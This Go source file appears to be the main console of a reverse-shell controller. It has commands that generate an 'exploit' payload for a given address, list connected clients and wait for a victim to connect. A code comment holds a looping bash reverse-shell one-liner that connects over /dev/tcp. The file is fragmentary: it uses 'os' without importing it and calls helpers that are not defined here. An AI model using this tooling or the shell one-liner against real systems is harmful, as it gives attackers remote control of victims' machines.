package main

import (
	"fmt"
	"time"
)

// while true; do bash -c 'bash -i >& /dev/tcp/127.0.0.1/1300 0>&1'; sleep 10; done
func main() {
	if len(os.Args) > 1 {
                _server = os.Args[1]
        }

	go listenf()

	fmt.Printf(logo)

	for {
		fmt.Printf(Fore["GREEN"]+"$ "+Fore["RESET"])
		var uin string = input()

		if uin == "" {
			continue
		}

		var puin = CommandLineParser(uin)

		switch puin[0] {
			case("mkexploit"):
				
				if len(puin) < 2 {
					fmt.Println(Fore["RED"]+"[-] Usage: mkexploit <public_addr>"+Fore["RESET"])
					continue
				}

				fmt.Printf(mkexploit(puin[1])+"\n")
			
			case("help"):
				fmt.Printf(help_text)
			case("show"):
				show_clients()
			case("exploit"):
				if len(puin) > 1 {
					v_client = puin[1]
				} else {
					v_client = "*"
				}

				fmt.Println(Fore["BLUE"]+"[*] Waiting for a connection"+Fore["RESET"])

				stop = true
				
				for {
					if stop {
						time.Sleep(time.Second*1)
					} else {
						break;
					}
				}
			default:
				fmt.Println(Fore["RED"]+"[-] Command not found"+Fore["RESET"])
		}


	}
}
